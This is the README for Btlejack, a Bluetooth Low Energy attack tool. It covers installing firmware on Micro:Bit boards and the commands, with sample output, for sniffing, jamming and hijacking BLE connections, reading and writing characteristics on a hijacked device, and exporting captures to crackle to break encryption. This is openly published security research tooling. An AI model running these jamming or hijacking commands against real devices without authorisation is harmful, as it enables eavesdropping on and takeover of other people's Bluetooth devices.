BtleJack: a new Bluetooth Low Energy swiss-army knife
#####################################################

Btlejack provides everything you need to sniff, jam and hijack Bluetooth Low Energy devices. It relies on one or more `BBC Micro:Bit <http://microbit.org/>`_. devices running a dedicated firmware. You may also
want to use an `Adafruit's Bluefruit LE sniffer <https://www.adafruit.com/product/2269>`_ or a `nRF51822 Eval Kit <https://www.waveshare.com/wiki/BLE400>`_, as we added support for these devices.

Current version of this tool (2.0) supports BLE 4.x and 5.x. The BLE 5.x support is limited, as it does only support the 1Mbps Uncoded PHY and does not support channel map updates.


Requirements
============

You need a UNIX based system (for example a Raspberry Pi). If you use the BBC Micro:Bit, you will need one to three Micro:Bit devices (three devices recommended) and for each device one free USB port. The power consumption of a Micro:Bit is rather low, so you can use a single USB port and a passive hub for powering the three recommended units.

**If you connect 3 microbits at the same time on your computer, Btlejack will be able to sniff on every advertising channel and has far more chance to capture the connection request.**

How to install
==============

First, install the ``btlejack`` Python3 client software with Pip:

::

  $ sudo pip3 install btlejack


Then, connect your Micro:Bit device to your computer with a USB cable, mount the associated mass storage device (the mount point must contain **MICROBIT**), and issue the following command:

::

  $ btlejack -i

This will program every Micro:Bit device connected to your computer, and make
them ready to use with Btlejack. It will use the correct firmware version for the current client software, so it is highly recommended to perform this firmware installation procedure each time you update Btlejack.

If you are using a *Bluefruit LE sniffer* or a *nRF51822 Eval Kit*, then please use an external SWD programmer to flash your device with `this firmware <https://github.com/virtualabs/btlejack-firmware/raw/master/dist/btlejack-firmware-ble400.hex>`_.

Keep your devices connected and you're all set !

**NOTE** This only works with posix compatible systems.

How to use Btlejack
===================

Using Btlejack is quite easy. Btlejack can:

- use various devices
- sniff an existing BLE connection
- sniff new BLE connections
- jam an existing BLE connection
- hijack an existing BLE connection
- export captured packets to various PCAP formats


Specify devices to use
----------------------

Btlejack normally tries to autodetect and use connected compatible devices (Micro:Bit only for the moment), but since the firmware can be hacked or modified
to work with other nRF51822-based boards, it provides a specific options to allow compatibility with these devices.

The ``-d`` option lets you specify one or more devices with Btlejack. Note that this option will disable the automatic detection of devices, and you should
add as many devices as you may need:

::

  $ btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s



Sniffing an existing connection
-------------------------------

First, find an existing connection to target with ``btlejack``:

::

  $ btlejack -s
  BtleJack version 1.1

  [i] Enumerating existing connections ...
  [ - 54 dBm] 0xcd91d517 | pkts: 1
  [ - 46 dBm] 0xcd91d517 | pkts: 2

The first value (in dBm) shows the power of the signal, the greater this value is the better the sniffed connection will be.

The second value (hex) is the associated *access address*, a 32-bit value identifying a link between two bluetooth low energy compatible devices.

The last value is the number of packets seen with this *access address*. The higher this value is, the more probable the corresponding *access address* is used.

Then, use the `-f` option to follow a specific connection:

::

  $ btlejack -f 0xdda4845e
  BtleJack version 1.1

  [i] Detected sniffers:
   > Sniffer #0: fw version 1.1

  [i] Synchronizing with connection 0xdda4845e ...
  ✓ CRCInit: 0x2a035e
  ✓ Channel Map = 0x1fffffffff
  ✓ Hop interval = 39
  ✓ Hop increment = 15
  [i] Synchronized, packet capture in progress ...
  LL Data: 02 07 03 00 04 00 0a 03 00
  LL Data: 0a 08 04 00 04 00 0b 5a 69 70
  LL Data: 02 07 03 00 04 00 0a 03 00
  LL Data: 0a 08 04 00 04 00 0b 5a 69 70


**If you are using more than 1 microbit, Btlejack will parallelize some of the sniffing operations in order to speed up the connection parametres recovery !**

Sniffing for new connections
----------------------------

The  ``-c`` option supported by ``btlejack`` allows you to specify the target BD address, or you may want to use ``any`` to capture any new connection created.

::

  $ btlejack -c any
  BtleJack version 1.1

  [i] Detected sniffers:
   > Sniffer #0: version 1.1
   > Sniffer #1: version 1.1
  LL Data: 05 22 df b4 6f 95 c5 55 c0 0a f6 99 23 40 1d 7b 2f 0a 9a f4 93 01 12 00 27 00 00 00 d0 07 ff ff ff ff 1f 0b
  [i] Got CONNECT_REQ packet from 55:c5:95:6f:b4:df to 40:23:99:f6:0a:c0
   |-- Access Address: 0x0a2f7b1d
   |-- CRC Init value: 0x93f49a
   |-- Hop interval: 39
   |-- Hop increment: 11
   |-- Channel Map: 1fffffffff
   |-- Timeout: 20000 ms

  LL Data: 03 09 08 0f 00 00 00 00 00 00 00
  LL Data: 03 09 08 0f 00 00 00 00 00 00 00
  LL Data: 0b 06 0c 08 0f 00 09 41
  LL Data: 03 06 0c 07 1d 00 d3 07

or you may also want to specify the target BD address:

::

  $ btlejack -c 03:e1:f0:00:11:22


Jamming a connection
--------------------

Once a connection identified by its *access address*, you can provide jam it by using the ``-j`` option:

::

  $ btlejack -f 0x129f3244 -j̀


Hijacking a BLE connection
--------------------------

Btlejack is also able to hijack an existing connection, use the ``-t`` option to do so. Once hijacked, Btlejack will give you a prompt allowing you to interact with the hijacked device.

First, hijack an existing connection:

::

  $ btlejack -f 0x9c68fd30 -t -m 0x1fffffffff
  BtleJack version 1.1

  [i] Using cached parameters (created on 2018-08-11 01:48:24)
  [i] Detected sniffers:
   > Sniffer #0: fw version 1.1

  [i] Synchronizing with connection 0x9c68fd30 ...
  ✓ CRCInit: 0x81f733
  ✓ Channel map is provided: 0x1fffffffff
  ✓ Hop interval = 39
  ✓ Hop increment = 9
  [i] Synchronized, hijacking in progress ...
  [i] Connection successfully hijacked, it is all yours \o/
  btlejack>

Then use the following commands to interact with the device:
- **discover**: performs services and characteristics enumeration, will give you all the information about services and characteristics
- **write**: write data to a specific value handle
- **read**: read data from a specific value handle
- **ll**: sends a raw link-layer packet (for ninjas)

*discover* command
^^^^^^^^^^^^^^^^^^

The ``discover`` command will send and receive Bluetooth LE packets and retrieve all the services UUIDs and parameters, as well as characteristics UUIDs and parameters:

::

  btlejack> discover
  start: 0001 end: 0005
  start: 0014 end: 001a
  start: 0028 end: ffff
   Discovered services:
  Service UUID: 1801
   Characteristic UUID: 2a05
     | handle: 0002
     | properties: indicate  (20)
     \ value handle: 0003

  Service UUID: 1800
   Characteristic UUID: 2a04
     | handle: 0019
     | properties: read  (02)
     \ value handle: 001a

   Characteristic UUID: 2a00
     | handle: 0015
     | properties: read  (02)
     \ value handle: 0016

   Characteristic UUID: 2a01
     | handle: 0017
     | properties: read  (02)
     \ value handle: 0018

  Service UUID: 1824
   Characteristic UUID: 2abc
     | handle: 0029
     | properties: write indicate  (28)
     \ value handle: 002a

*read* command
^^^^^^^^^^^^^^

The ``read`` command accepts a single parameter, the value handle corresponding to the characteristic you want to read from:

::

  btlejack> read 0x16
  read>> 4c 47 20 77 65 62 4f 53 20 54 56

*write* command
^^^^^^^^^^^^^^^

The ``write`` command accepts three parameters:

::

  btlejack> write <value handle> <data format> <data>


Supported data formats:

- ``hex``: hex data (i.e. "414261")
- ``str``: text string, may be encapsulated in double quotes

*ll* command
^^^^^^^^^^^^

This last command allows you to send Bluetooth Low Energy Link-layer PDUs, in hex form, as specified in Volume 6, Part B, Chapter 2.4.


PCAP file export
----------------

One interesting feature of Btlejack is the possibility to export the captured data to a PCAP file.

Btlejack supports the following DLT formats:

* DLT_BLUETOOTH_LE_LL_WITH_PHDR (same)
* DLT_NORDIC_BLE (the one used by Nordic' sniffer)
* DLT_BLUETOOTH_LE_LL (supported on latest versions of Wireshark)

The output file may be specified using the `-o` option, while the output format may be specified with the `-x` option. Valid formats values are: `ll_phdr`, `nordic`, or `pcap` (default).

::

  $ btlejack -f 0xac56bc12 -x nordic -o capture.nordic.pcap


The ``ll_phdr`` export type is useful when sniffing an encrypted connection, as it is also supported by `crackle <https://github.com/mikeryan/crackle>`_. So if you want to sniff and break encrypted connections, this is the way to go.

You may also need to tell crackle to use a specific cracking strategy, by using the `-s` option:

::

  $ crackle -i some.pcap -s 1


Connection cache
----------------

Btlejack uses a *connection cache* to store some connection-related value in order to speed up
things a bit. This connection cache may cause some problems, especially if an access address has
been previously seen.

This cache can be flushed with the ``-z`` option:

::

  $ btlejack -z

Dumping live packets with Wireshark
-----------------------------------

Btlejack 2.0 introduces a new *-w* option that allows you to specify a FIFO path (existing or not) in order
to perform packets live analysis:

::

  $ btlejack -c any -w /tmp/blepipe

You can even use a FIFO and an output file as the same time:

::

  $ btlejack -c any -w /tmp/blepipe -o blepackets.pcap

Hint for using btlejack on a Raspberry Pi
-----------------------------------------
If you have previously enabled **virtual ethernet over USB** (RNDIS), e.g. to setup a Raspberry Pi Zero W over USB, you need to disable this again (i.e. remove ``dtoverlay=dwc2`` from boot/config.txt and ``modules-load=dwc2,g_ether`` from boot/cmdline.txt, then ``sudo reboot``), because this would otherwise interfere with the sniffers' USB connections.

Bluetooth LE 5 & 5.1 support
============================

This version supports Bluetooth Low Energy versions 5 and 5.1 and especially the new *channel selectrion algorithm* introduced
in version 5 (CSA #2). However, since the hardware used does not support the two new PHYs added from version 5, it will only be
able to sniff, jam, and maybe hijack connections using the **1Mbps uncoded PHY**.

Please also note that the current implementation of CSA #2 included in Btlejack does not support channel map updates, for the moment.

Sniffing a new BLE 5 connection
-------------------------------

Btlejack automatically detects the channel selection algorithm used, so you don't have to worry and just capture packets as usual.

Sniffing an existing BLE 5 connection
-------------------------------------

Sniffing an existing BLE 5 connection (that uses the 1Mbps uncoded PHY, and only this PHY) is not so difficult. First, you must specify
that you want to target a BLE 5 connection, by using the *-5* option. Please note that there is no way to tell if an existing connection
uses CSA #2 or CSA #1, so you have to try both techniques until one works.

::

  $ btlejack -f 0x11223344 -5

Btlejack will then recover the channel map used and then the hop interval value:

::

  $ btlejack -f 0x11223344 -5
  [i] Synchronizing with connection 0x11223344 ...
  ✓ CRCInit: 0x40d64f
  ✓ Channel Map = 0x1fffffffff
  ✓ Hop interval = 160

It will then try to recover this connection PRNG counter value:

::

  $ btlejack -f 0x11223344 -5
  [i] Synchronizing with connection 0x11223344 ...
  ✓ CRCInit: 0x40d64f
  ✓ Channel Map = 0x1fffffffff
  ✓ Hop interval = 160
  ✓ CSA2 PRNG counter = 5137
  [i] Synchronized, packet capture in progress ...

Once done, Btlejack is synchronized with this connection and will process packets
as usual.

Jamming an existing BLE 5 connection
-------------------------------------

Nothing new here, except that you must specify that you are attacking a BLE 5 connection,
by using the *-5* option.

Please note that you can optimize this attack by also specifying the channel map
and hop interval value to use, by using respectively the *-m* and *-p* flags. Both
of them MUST be provided, unless it would not work.


Hijacking an existing BLE 5 connection
--------------------------------------

I did not manage to hijack a BLE 5 connection at this time, as this attack is
time-sensitive. My BLE 5 devices use a latency of 0, thus allowing no delay and
causing this attack to fail.

When I will get my hands on some legitimate BLE 5 devices, I will improve this.
